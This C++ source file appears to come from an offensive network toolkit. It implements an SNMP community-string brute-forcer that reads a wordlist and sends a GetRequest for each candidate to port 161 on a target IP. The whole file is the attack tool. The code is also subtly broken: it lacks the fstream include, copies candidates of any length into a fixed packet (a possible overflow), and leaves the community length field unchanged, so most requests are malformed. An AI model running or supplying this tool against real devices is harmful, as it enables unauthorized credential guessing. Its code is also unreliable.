#include "layer7/snmp.h"
#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <vector>
namespace lemonade {
void SNMP::brute(const std::vector<std::string>& args) {
    if(args.size()<2){ std::cerr<<"Usage: -snmpbrute <ip> <community_list>\n"; return; }
    std::string ip=args[0];
    std::string list_file=args[1];
    std::ifstream f(list_file);
    std::string community;
    int sock=socket(AF_INET,SOCK_DGRAM,0);
    struct sockaddr_in addr;
    addr.sin_family=AF_INET;
    addr.sin_addr.s_addr=ip_to_int(ip);
    addr.sin_port=htons(161);
    while(std::getline(f,community)){
        // Build SNMP GetRequest for sysDescr (1.3.6.1.2.1.1.1.0)
        unsigned char packet[] = {
            0x30, 0x29, 0x02, 0x01, 0x00, 0x04, 0x06, 0x70, 0x75, 0x62, 0x6c, 0x69, 0x63, 0xa0, 0x1c, 0x02,
            0x04, 0x00, 0x00, 0x00, 0x00, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x0e, 0x30, 0x0c, 0x06,
            0x08, 0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00, 0x05, 0x00
        };
        // Replace community string
        memcpy(packet+7, community.c_str(), community.size());
        packet[1]=0x29 - (6-community.size()); // adjust length
        sendto(sock,packet,sizeof(packet),0,(struct sockaddr*)&addr,sizeof(addr));
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock,&fds);
        struct timeval tv={1,0};
        if(select(sock+1,&fds,NULL,NULL,&tv)>0){
            char recvbuf[1024];
            socklen_t addrlen=sizeof(addr);
            int n=recvfrom(sock,recvbuf,sizeof(recvbuf),0,(struct sockaddr*)&addr,&addrlen);
            if(n>0){
                std::cout<<"Valid community: "<<community<<"\n";
                break;
            }
        }
    }
    close(sock);
}
}
